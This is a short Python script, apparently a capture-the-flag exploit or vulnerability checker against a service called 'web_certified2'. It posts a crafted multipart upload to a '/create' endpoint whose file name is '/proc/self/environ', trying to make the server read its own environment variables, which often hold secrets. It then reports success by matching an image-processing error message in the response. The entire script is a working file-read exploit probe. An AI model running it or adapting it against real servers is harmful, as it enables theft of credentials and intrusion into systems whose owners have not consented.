import requests
import re
import sys


def web_certified2(host):
    try:
        res = requests.post(
            f"https://{host}/create",
            headers={"content-type": 'multipart/form-data;boundary="boundary"'},
            data='--boundary\r\nContent-Disposition: form-data; name="file"; filename="/proc/self/environ"\r\nContent-Type: text/plain\r\n\r\n\r\n--boundary',
            timeout=3,
        )
    except requests.exceptions.RequestException:
        return 2

    match = re.search(r"image processing failed on \./data/([a-f\d-]+):", res.text)
    if match is None:
        return 1

    return 0


if __name__ == "__main__":
    if web_certified2(sys.argv[1]) != 0:
        exit(1)
